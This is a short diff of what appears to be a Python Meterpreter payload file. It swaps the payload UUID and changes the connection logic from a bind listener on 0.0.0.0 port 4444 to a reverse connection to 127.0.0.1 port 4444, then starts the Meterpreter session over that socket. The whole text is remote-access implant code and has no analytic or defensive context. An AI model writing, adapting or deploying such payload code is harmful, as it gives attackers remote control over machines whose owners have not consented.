@@ -66,7 +66,7 @@ HTTP_USER_AGENT = None
 HTTP_COOKIE = None
 HTTP_HOST = None
 HTTP_REFERER = None
-PAYLOAD_UUID = '192c8382f96e8c68a4c3b1d7f9d81de2'
+PAYLOAD_UUID = 'e05607343811083c354120556b0928f3'
 SESSION_GUID = '00000000000000000000000000000000'
 SESSION_COMMUNICATION_TIMEOUT = 300
 SESSION_EXPIRATION_TIMEOUT = 604800
@@ -1397,13 +1397,9 @@ if not _try_to_fork or (_try_to_fork and os.fork() == 0):
         transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
                 http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
     else:
-        bind_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        bind_sock.bind(('0.0.0.0', 4444))
-
-        bind_sock.listen(1)
-
-        s, address = bind_sock.accept()
+        s.connect(('127.0.0.1',4444))
 
         transport = TcpTransport.from_socket(s)
     met = PythonMeterpreter(transport)
